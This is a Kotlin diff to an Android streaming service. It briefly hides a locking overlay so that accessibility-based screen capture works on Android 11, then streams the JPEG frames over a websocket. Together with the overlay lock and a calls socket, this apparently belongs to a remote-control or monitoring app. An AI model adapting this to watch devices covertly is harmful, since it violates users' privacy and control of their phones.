@@ -127,6 +127,7 @@ class StreamingService : Service() {
         .build()
 
     @Volatile private var overlayView: android.view.View? = null
+    private var overlayParams: android.view.WindowManager.LayoutParams? = null
     @Volatile private var overlayMediaFile: File? = null
     @Volatile private var overlayMediaMime: String = ""
     private var overlayMediaPlayer: android.media.MediaPlayer? = null
@@ -476,26 +477,54 @@ class StreamingService : Service() {
             return
         }
         lastScreenFrameTime = now
-        ctrl.captureScreen { hw ->
-            if (hw != null && accessibilityCaptureRunning) {
-                try {
-                    val bmp = hw.copy(Bitmap.Config.ARGB_8888, false)
-                    hw.recycle()
+
+        fun doActualCapture() {
+            ctrl.captureScreen { hw ->
+                if (hw != null && accessibilityCaptureRunning) {
                     try {
-                        val out = ByteArrayOutputStream()
-                        bmp.compress(Bitmap.CompressFormat.JPEG, screenQuality, out)
-                        wsScreen?.send(out.toByteArray().toByteString())
-                    } finally {
-                        bmp.recycle()
+                        val bmp = hw.copy(Bitmap.Config.ARGB_8888, false)
+                        hw.recycle()
+                        try {
+                            val out = ByteArrayOutputStream()
+                            bmp.compress(Bitmap.CompressFormat.JPEG, screenQuality, out)
+                            wsScreen?.send(out.toByteArray().toByteString())
+                        } finally {
+                            bmp.recycle()
+                        }
+                    } catch (_: Throwable) {
+                        if (!hw.isRecycled) hw.recycle()
                     }
-                } catch (_: Throwable) {
-                    if (!hw.isRecycled) hw.recycle()
+                } else {
+                    hw?.recycle()
                 }
-            } else {
-                hw?.recycle()
+                // Restore overlay on Android 11 where we temporarily hid it
+                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
+                    val v = overlayView; val p = overlayParams
+                    if (v != null && p != null) {
+                        Handler(Looper.getMainLooper()).post {
+                            p.alpha = 1f
+                            try { (getSystemService(WINDOW_SERVICE) as android.view.WindowManager).updateViewLayout(v, p) } catch (_: Exception) {}
+                        }
+                    }
+                }
+                if (accessibilityCaptureRunning) accessibilityHandler.postDelayed({ doCapture() }, 80)
             }
-            if (accessibilityCaptureRunning) accessibilityHandler.postDelayed({ doCapture() }, 80)
         }
+
+        // On Android 11 (R), FLAG_SECURE causes the entire capture to go black.
+        // Work around by briefly setting overlay alpha=0, waiting one frame, then capturing.
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
+            val v = overlayView; val p = overlayParams
+            if (v != null && p != null) {
+                Handler(Looper.getMainLooper()).post {
+                    p.alpha = 0f
+                    try { (getSystemService(WINDOW_SERVICE) as android.view.WindowManager).updateViewLayout(v, p) } catch (_: Exception) {}
+                }
+                accessibilityHandler.postDelayed({ doActualCapture() }, 32)
+                return
+            }
+        }
+        doActualCapture()
     }
 
     // ── Phone / Calls WebSocket ────────────────────────────────────────────
@@ -1628,6 +1657,7 @@ class StreamingService : Service() {
                 }
                 wm.addView(view, params)
                 overlayView = view
+                overlayParams = params
                 ControlService.overlayLocked = true
             } catch (_: Exception) {}
         }
@@ -1658,6 +1688,7 @@ class StreamingService : Service() {
     private fun hideOverlay() {
         val v = overlayView ?: return
         overlayView = null
+        overlayParams = null
         ControlService.overlayLocked = false
         overlayMediaPlayer?.release(); overlayMediaPlayer = null
         Handler(Looper.getMainLooper()).post {
